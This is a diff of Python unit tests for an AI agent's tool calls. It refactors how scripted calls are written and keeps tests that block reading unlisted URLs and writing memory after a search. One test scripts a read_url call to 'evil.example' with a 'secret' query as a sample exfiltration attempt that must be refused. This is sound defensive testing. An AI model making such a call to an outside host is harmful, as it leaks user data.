@@ -16,8 +16,9 @@ from unittest import mock
 
 try:
     from app import agent
+    from app.agent.calls import render_call
     from app.tools import news, open_result, results, web_search
-    from app.tools.base import CALL, CallContext, Link, ToolResult, available
+    from app.tools.base import CALL, CallContext, Link, ToolResult
     from evals.scripted import ScriptedEngine
     from tests import support
     from tests.support import collect
@@ -161,7 +162,6 @@ class OpenTests(unittest.IsolatedAsyncioTestCase):
         reader.assert_awaited_once_with("https://www.reuters.com/world/budget")
 
 
-NONE = '{"tool": "none"}'
 RESULTS = ToolResult(True, "Search", card="search", data={"items": [
     results.item("Tides explained", "https://example.org/tides"),
 ]})
@@ -187,25 +187,25 @@ class ProvenanceTests(RunCase):
     """An address a search gave may be read; one a page gave may not."""
 
     async def test_a_page_from_the_results_may_be_read_by_its_address(self) -> None:
-        read = '{"tool": "read_url", "args": {"url": "https://example.org/tides"}}'
-        search = '{"tool": "web_search", "args": {"query": "tides"}}'
-        engine = self.scripted(search, read, NONE, "High water at 06:12.")
+        read = render_call("read_url", {"url": "https://example.org/tides"})
+        search = render_call("web_search", {"query": "tides"})
+        engine = self.scripted(search, read, "High water at 06:12.")
         seen = support.played_tools(self, {"web_search": RESULTS, "read_url": PAGE})
         trace = agent.Trace()
         await collect(agent.run("when is high water", history=[], trace=trace, engine=engine))
         self.assertEqual(seen["read_url"], [{"url": "https://example.org/tides"}])
 
     async def test_an_address_nothing_listed_is_still_refused(self) -> None:
-        read = '{"tool": "read_url", "args": {"url": "https://evil.example/?q=secret"}}'
-        search = '{"tool": "web_search", "args": {"query": "tides"}}'
+        read = render_call("read_url", {"url": "https://evil.example/?q=secret"})
+        search = render_call("web_search", {"query": "tides"})
         engine = self.scripted(search, read, read, "I could not open that.")
         seen = support.played_tools(self, {"web_search": RESULTS, "read_url": PAGE})
         await collect(agent.run("when is high water", history=[], engine=engine))
         self.assertEqual(seen["read_url"], [])
 
     async def test_after_a_search_nothing_is_written_down(self) -> None:
-        remember = '{"tool": "remember", "args": {"text": "the user likes tides"}}'
-        search = '{"tool": "web_search", "args": {"query": "tides"}}'
+        remember = render_call("remember", {"text": "the user likes tides"})
+        search = render_call("web_search", {"query": "tides"})
         engine = self.scripted(search, remember, remember, "Done.")
         support.temp_database(self)
         seen = support.played_tools(self, {"web_search": RESULTS, "remember": ToolResult(True, "Noted")})
@@ -213,7 +213,7 @@ class ProvenanceTests(RunCase):
         self.assertEqual(seen["remember"], [])
 
     async def test_the_list_a_run_was_given_is_what_open_result_opens(self) -> None:
-        engine = self.scripted('{"tool": "open_result", "args": {"number": "1"}}', NONE, "Read it.")
+        engine = self.scripted(render_call("open_result", {"number": "1"}), "Read it.")
         handed: list = []
 
         async def call_tool(name: str, args: dict) -> ToolResult:
